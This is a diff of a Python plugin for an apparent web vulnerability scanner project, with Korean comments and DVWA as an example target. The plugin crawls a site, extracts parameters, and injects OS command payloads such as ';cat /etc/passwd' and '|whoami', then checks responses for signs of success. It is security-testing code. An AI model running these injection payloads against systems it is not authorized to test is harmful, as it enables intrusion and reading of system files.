@@ -1,35 +1,32 @@
 """
-oscommand.py — 완전 자동화 버전
-입력: base URL 1개
-기능:
-  - base URL에서 시작해 HTML을 재귀 크롤링(depth=2)
-  - 내부 링크(a, form, script, iframe 등) 자동 수집
-  - 파라미터 자동 추출 후 OS Command Injection 테스트
-  - 취약한 결과만 요약 출력
+OS Command Injection Plugin (자동화 버전)
+- 내부 링크 자동 크롤링
+- 파라미터 추출 및 취약점 테스트
+- DVWA Adapter 인증 세션 공유 가능
 """
 
+from __future__ import annotations
 import re
-import sys
-import time
 import urllib.parse
-from typing import Set, List
-from collections import deque
-from s2n.core.s2nscanner.crawler import crawl_recursive
-from s2n.core.s2nscanner.auth.dvwa_adapter import DVWAAdapter
+from typing import List, Dict
+import logging
 
+from s2n.s2nscanner.http.client import HttpClient
+from s2n.s2nscanner.crawler import crawl_recursive
+from s2n.s2nscanner.interfaces import Finding, Severity
 
-try:
-    from s2n.core.s2nscanner.http.client import HttpClient
-except Exception:
-    from ..http.client import HttpClient  # type: ignore
+logger = logging.getLogger("s2n.plugin.oscommand")
 
-# 기본 설정
+# ------------------------------
+# 전역 설정
+# ------------------------------
 PAYLOADS = [
     ";id", "&&id", "|id",
     ";whoami", "|whoami",
     ";cat /etc/passwd", "|uname -a",
     "&echo vulnerable"
 ]
+
 PATTERNS = [
     r"uid=\d+", r"gid=\d+",
     r"root:.*:0:0:",
@@ -37,27 +34,26 @@ PATTERNS = [
     r"vulnerable",
     r"linux", r"ubuntu",
 ]
+
 COMMON_PARAMS = ["id", "cmd", "ip", "input", "search", "q", "page", "file"]
 
-
-# 파라미터 추출
+# ------------------------------
+# 유틸 함수: 파라미터 추출
+# ------------------------------
 def extract_params(html: str, url: str) -> List[str]:
     params = set()
-    # URL 쿼리
     parsed = urllib.parse.urlparse(url)
     q = urllib.parse.parse_qs(parsed.query)
     params.update(q.keys())
-
-    # form input name
     for m in re.finditer(r'name=["\']?([a-z0-9_\-]+)["\']?', html, re.I):
         params.add(m.group(1))
-
     return list(params or COMMON_PARAMS)
 
-
-# 스캐너: OS Command Injection 테스트
-def test_os_command_injection(target: str, client: HttpClient, params: List[str], timeout: int = 5) -> dict:
-    result = {"target": target, "vulnerable": False}
+# ------------------------------
+# 유틸 함수: 테스트 실행
+# ------------------------------
+def test_os_command_injection(target: str, client: HttpClient, params: List[str], timeout: int = 5) -> List[Dict]:
+    findings = []
     try:
         for p in params:
             for payload in PAYLOADS:
@@ -73,109 +69,60 @@ def test_os_command_injection(target: str, client: HttpClient, params: List[str]
 
                 for pattern in PATTERNS:
                     if re.search(pattern, text):
-                        result.update({
-                            "vulnerable": True,
+                        logger.debug("[+] Vulnerable %s param=%s payload=%s", new_url, p, payload)
+                        findings.append({
+                            "id": f"oscmd-{hash(new_url) & 0xffff:x}",
+                            "plugin": "oscommand",
+                            "severity": Severity.HIGH,
+                            "title": "OS Command Injection",
+                            "description": f"Detected OS command injection in parameter '{p}'",
+                            "url": new_url,
                             "payload": payload,
                             "evidence": pattern,
-                            "param": p,
-                            "status": r.status_code,
                         })
-                        return result
+                        # 하나의 param에서 발견되면 break
+                        break
     except Exception as e:
-        result["error"] = str(e)
-    return result
+        logger.warning("OSCommand test error: %s", e)
+    return findings
 
 
-# 결과 출력
-def print_summary(vulns: List[dict]):
-    CYAN = "\033[96m"
-    GREEN = "\033[92m"
-    YELLOW = "\033[93m"
-    RED = "\033[91m"
-    RESET = "\033[0m"
+# ------------------------------
+# Plugin 클래스 (Scanner에서 자동 탐지)
+# ------------------------------
+class Plugin:
+    name = "oscommand"
+    description = "Detects OS Command Injection vulnerabilities"
 
-    print(f"\n{CYAN}=== Vulnerability Summary ==={RESET}")
-    if not vulns:
-        print(f"{RED}No OS Command Injection vulnerabilities found.{RESET}")
-        return
+    def initialize(self, cfg=None, http: HttpClient | None = None):
+        self.http = http or HttpClient()
+        self.depth = cfg.get("depth", 2) if isinstance(cfg, dict) else 2
+        logger.info("OSCommand Plugin initialized (depth=%d)", self.depth)
 
-    for i, v in enumerate(vulns, 1):
-        print(f"\n{i}. {v['target']}")
-        print(f"   Status : {GREEN}VULNERABLE{RESET}")
-        print(f"   Param  : {YELLOW}{v.get('param')}{RESET}")
-        print(f"   Payload: {v.get('payload')}")
-        print(f"   Evidence: {v.get('evidence')}")
-    print(f"\n{CYAN}=============================={RESET}\n")
+    def scan(self, base_url: str, http: HttpClient) -> List[Finding]:
+        logger.info("Scanning base URL for OS command injection: %s", base_url)
 
+        # 1️⃣ 내부 링크 크롤링 (공통 모듈 사용)
+        targets = crawl_recursive(base_url, http, depth=self.depth)
+        logger.debug("Discovered %d URLs from crawl", len(targets))
 
+        findings: List[Finding] = []
 
-if __name__ == "__main__":
-    print("=== s2n 자동화 OS Command Injection 스캐너 ===")
-    base = input("Base URL을 입력하세요 (예: http://localhost/dvwa): ").strip()
-    if not base:
-        print("[ERROR] Base URL이 필요합니다.")
-        sys.exit(1)
-
-    depth = 2
-
-    # 1) HttpClient 생성 (공용 세션)
-    try:
-        client = HttpClient()
-    except Exception:
-        print("[ERROR] HttpClient 로드 실패")
-        sys.exit(1)
-
-    # 2) 인증 요청 여부 묻기 (선택)
-    use_auth = input("인증이 필요하면 Y, 아니면 N (기본 N): ").strip().lower() == "y"
-    if use_auth:
-        username = input("Username: ").strip() or "admin"
-        import getpass
-        password = getpass.getpass("Password: ") or "password"
-
-        adapter = DVWAAdapter(base_url=base, client=client)
-
-        print(f"[INFO] 인증 시도: {username}/(hidden) -> base: {base}")
-        try:
-            ok = adapter.ensure_authenticated([(username, password)], retries=1)
-            if not ok:
-                print("[WARN] 로그인 실패 — 인증이 필요한 영역은 접근할 수 없습니다.")
-                # 여기서 계속 진행하려면 주석 처리, 안전하게 종료하려면 sys.exit(1)
-                # sys.exit(1)
-            else:
-                print("[INFO] 인증 성공 — 세션 쿠키가 client에 설정되었습니다.")
-                print("[DEBUG] 세션 쿠키:", client.s.cookies.get_dict())
-        except TypeError:
-            # 구버전의 adapter를 사용하는 경우(혹시 authenticate(client, creds) 호출했던 코드 남아있다면)
+        # 2️⃣ 각 페이지별 파라미터 추출 및 테스트
+        for t in targets:
             try:
-                # try legacy call if adapter expects (client, creds)
-                used = adapter.authenticate([(username, password)])
-                if used:
-                    print("[INFO] 인증 성공(legacy).")
-                else:
-                    print("[WARN] 인증 실패(legacy).")
+                resp = http.get(t, timeout=5)
+                html = resp.text or ""
+                params = extract_params(html, t)
+                results = test_os_command_injection(t, http, params)
+                for r in results:
+                    findings.append(Finding(**r))
             except Exception as e:
-                print(f"[WARN] 인증 중 예외 발생: {e} — 계속 진행합니다.")
+                logger.debug("Failed to scan %s: %s", t, e)
 
-    # 3) 로그인(세션) 이후 크롤/스캔 수행
-    print(f"[INFO] {base} 에서 링크를 탐색 중 (depth={depth})...")
-    targets = crawl_recursive(base, client, depth=depth, timeout=5)
-    print(f"[INFO] 발견된 내부 페이지 수: {len(targets)}")
+        logger.info("OSCommand scan finished: %d findings", len(findings))
+        return findings
 
-    results = []
-    vulns = []
-
-    for i, t in enumerate(targets, 1):
-        try:
-            resp = client.get(t, timeout=5)
-            html = resp.text or ""
-            params = extract_params(html, t)
-            print(f"[{i}/{len(targets)}] 스캔 중: {t} (params: {params})")
-            res = test_os_command_injection(t, client, params, timeout=5)
-            if res.get("vulnerable"):
-                vulns.append(res)
-            results.append(res)
-        except Exception:
-            continue
-
-    print_summary(vulns)
-    print("[DONE] 스캔 완료.")
+    def teardown(self):
+        logger.debug("OSCommand Plugin teardown complete.")
+        
